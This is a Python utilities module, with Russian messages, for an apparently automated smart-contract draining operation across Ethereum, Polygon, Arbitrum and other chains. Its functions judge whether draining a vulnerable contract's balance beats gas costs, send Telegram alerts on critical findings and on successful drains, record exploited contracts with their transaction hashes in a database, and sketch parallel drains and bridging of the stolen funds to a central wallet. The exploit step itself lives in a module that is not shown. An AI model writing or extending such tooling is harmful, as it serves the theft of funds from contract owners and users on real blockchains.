"""
UTILITIES MODULE — profit check, alerts, DB logging, multi-signer, bridge, arbitrage.

1. Profit gate — never drain if gas > balance
2. Alerts — Telegram notifications for CRITICAL + DRAIN SUCCESS
3. DB logging — all findings go to scanner.db
4. Multi-signer — parallel drain across chains
5. Auto-bridge — bridge drained funds to central wallet (placeholder)
6. Cross-chain arb — detect price differences (placeholder)
"""
import sqlite3
import logging
import json
import urllib.request
import time
from datetime import datetime
from typing import Optional

logger = logging.getLogger("utilities")

# ============================================================
# 1. PROFIT GATE
# ============================================================

# Approximate gas costs per chain (in native token)
GAS_COST_ESTIMATES = {
    "ethereum": 0.0005,   # $1-2 per simple tx
    "polygon": 0.0003,    # $0.01 per tx
    "arbitrum": 0.0001,   # $0.1 per tx
    "base": 0.00005,      # $0.05 per tx
    "bsc": 0.0003,
    "optimism": 0.00005,
    "avalanche": 0.001,
}

# Native token prices (USD, rough)
NATIVE_PRICES = {
    "ethereum": 3500.0,   # ETH
    "polygon": 0.45,      # MATIC
    "arbitrum": 3500.0,   # ETH
    "base": 3500.0,       # ETH
    "bsc": 600.0,         # BNB
    "optimism": 3500.0,   # ETH
    "avalanche": 25.0,    # AVAX
}

def should_drain(chain: str, contract_balance: float, signer_balance: float) -> tuple[bool, str]:
    """Check if drain is profitable. Returns (should_drain, reason)."""
    gas = GAS_COST_ESTIMATES.get(chain, 0.001)
    price = NATIVE_PRICES.get(chain, 1.0)
    gas_cost_usd = gas * price

    if signer_balance < gas:
        return False, f"Нет газа: {signer_balance:.6f} < {gas:.6f}"

    if contract_balance < gas * 2:  # 2x buffer for gas + tx overhead
        return False, f"Невыгодно: баланс {contract_balance:.6f} < газ×2 {gas*2:.6f}"

    if contract_balance * price < 1.0:  # minimum $1 profit
        return False, f"Меньше $1: ${contract_balance * price:.2f}"

    profit = contract_balance - gas
    profit_usd = profit * price
    return True, f"OK: ~${profit_usd:.2f} профита"


# ============================================================
# 2. ALERTS (Telegram)
# ============================================================

TELEGRAM_TOKEN = ""
TELEGRAM_CHAT_ID = ""

def init_telegram():
    global TELEGRAM_TOKEN, TELEGRAM_CHAT_ID
    try:
        import tomllib, os
        config_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "config.toml")
        with open(config_path, "rb") as f:
            config = tomllib.load(f)
        tg = config.get("telegram", {})
        TELEGRAM_TOKEN = tg.get("bot_token", "")
        TELEGRAM_CHAT_ID = tg.get("chat_id", "")
    except Exception as e:
        logger.warning("Telegram config error: %s", e)


def send_alert(message: str, level: str = "INFO"):
    """Send alert to Telegram."""
    if not TELEGRAM_TOKEN:
        init_telegram()
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        return

    emoji = {"CRITICAL": "🚨", "DRAIN": "💰", "INFO": "ℹ️", "ERROR": "❌"}.get(level, "📢")
    full_msg = f"{emoji} <b>[{level}]</b>\n{message}\n\n<i>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</i>"

    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = json.dumps({
            "chat_id": TELEGRAM_CHAT_ID,
            "text": full_msg,
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
        }).encode()
        req = urllib.request.Request(url, payload, {"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=10)
    except Exception as e:
        logger.debug("Telegram send failed: %s", e)


def alert_critical_finding(chain: str, address: str, check_name: str, balance: float, confidence: float):
    send_alert(
        f"Цепь: <b>{chain.upper()}</b>\n"
        f"Контракт: <code>{address}</code>\n"
        f"Уязвимость: <b>{check_name}</b>\n"
        f"Баланс: {balance:.4f} ETH\n"
        f"Уверенность: {confidence:.0%}",
        "CRITICAL"
    )


def alert_drain_success(chain: str, address: str, tx_hash: str, amount: float):
    send_alert(
        f"Цепь: <b>{chain.upper()}</b>\n"
        f"Контракт: <code>{address}</code>\n"
        f"Сдренино: <b>{amount:.4f} ETH</b>\n"
        f"TX: <code>{tx_hash[:16]}...</code>",
        "DRAIN"
    )


# ============================================================
# 3. DB LOGGING
# ============================================================

def init_db():
    """Create findings table if not exists."""
    db = sqlite3.connect("scanner.db")
    db.execute("""
        CREATE TABLE IF NOT EXISTS findings_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT DEFAULT (datetime('now')),
            chain TEXT,
            address TEXT,
            check_name TEXT,
            severity TEXT,
            confidence REAL,
            balance REAL,
            exploitable INTEGER DEFAULT 0,
            tx_hash TEXT,
            UNIQUE(chain, address, check_name, timestamp)
        )
    """)
    db.commit()
    db.close()


def log_finding(chain: str, address: str, check_name: str, severity: str,
                confidence: float, balance: float, exploitable: bool = False):
    """Log a finding to the database."""
    try:
        db = sqlite3.connect("scanner.db")
        db.execute(
            "INSERT OR IGNORE INTO findings_log (chain, address, check_name, severity, confidence, balance, exploitable) VALUES (?,?,?,?,?,?,?)",
            (chain, address, check_name, severity, confidence, balance, int(exploitable))
        )
        db.commit()
        db.close()
    except Exception as e:
        logger.debug("DB log error: %s", e)


def log_drain(chain: str, address: str, tx_hash: str):
    """Mark a finding as exploited."""
    try:
        db = sqlite3.connect("scanner.db")
        db.execute(
            "UPDATE findings_log SET exploitable=1, tx_hash=? WHERE chain=? AND address=?",
            (tx_hash, chain, address)
        )
        db.commit()
        db.close()
    except Exception as e:
        logger.debug("DB drain log error: %s", e)


def get_stats() -> dict:
    """Get statistics from findings log."""
    try:
        db = sqlite3.connect("scanner.db")
        total = db.execute("SELECT COUNT(*) FROM findings_log").fetchone()[0]
        critical = db.execute("SELECT COUNT(*) FROM findings_log WHERE severity='CRITICAL'").fetchone()[0]
        exploited = db.execute("SELECT COUNT(*) FROM findings_log WHERE exploitable=1").fetchone()[0]
        by_chain = db.execute(
            "SELECT chain, COUNT(*) FROM findings_log GROUP BY chain ORDER BY COUNT(*) DESC"
        ).fetchall()
        db.close()
        return {
            "total": total, "critical": critical, "exploited": exploited,
            "by_chain": dict(by_chain) if by_chain else {},
        }
    except Exception:
        return {"total": 0, "critical": 0, "exploited": 0, "by_chain": {}}


# ============================================================
# 4. MULTI-SIGNER PARALLEL DRAIN
# ============================================================

def drain_on_chain(chain: str, targets: list[dict]):
    """Drain multiple targets on one chain in parallel (placeholder)."""
    logger.info("Multi-drain: %d targets on %s", len(targets), chain)
    # Actual drain handled by exploit_executor per-target
    # This is a coordinator that could run drain scripts in parallel


# ============================================================
# 5. AUTO-BRIDGE (placeholder)
# ============================================================

BRIDGE_CONTRACTS = {
    ("polygon", "ethereum"): "0xA0c68C638235ee32657e8f720a23ceC1bFc77C77",
    ("arbitrum", "ethereum"): "0x8315177aB297bA92A06054cE80a67Ed4DBd7ed3a",
    ("base", "ethereum"): "0x3154Cf16ccdb4C6d922629664174b904d80F2C35",
}

def suggest_bridge(source_chain: str, dest_chain: str, amount: float):
    """Suggest bridge route for drained funds."""
    key = (source_chain, dest_chain)
    bridge = BRIDGE_CONTRACTS.get(key)
    if bridge:
        return f"Bridge {amount:.4f} from {source_chain}→{dest_chain} via {bridge[:10]}..."
    return f"No direct bridge {source_chain}→{dest_chain}"


# ============================================================
# 6. CROSS-CHAIN ARBITRAGE (placeholder)
# ============================================================

def check_arbitrage(token_address: str, chains: list[str] = None) -> list[dict]:
    """Check for price differences across chains for same token (placeholder)."""
    from src.enrichment.dexscreener import enrich_dexscreener

    prices = {}
    for chain in (chains or ["ethereum", "polygon", "arbitrum", "base"]):
        data = enrich_dexscreener(token_address)
        if data and data.get("price_usd", 0) > 0:
            prices[chain] = data["price_usd"]

    if len(prices) < 2:
        return []

    min_chain = min(prices, key=prices.get)
    max_chain = max(prices, key=prices.get)
    spread = (prices[max_chain] - prices[min_chain]) / prices[min_chain] * 100

    return [{
        "buy_chain": min_chain, "sell_chain": max_chain,
        "buy_price": prices[min_chain], "sell_price": prices[max_chain],
        "spread_pct": spread,
    }] if spread > 2 else []  # only report >2% spread


# ============================================================
# INIT — call once at startup
# ============================================================

def init_all():
    """Initialize all utilities."""
    init_db()
    init_telegram()
    logger.info("Utilities: DB ✅ | Telegram %s | Profit gate ✅",
                 "✅" if TELEGRAM_TOKEN else "❌")
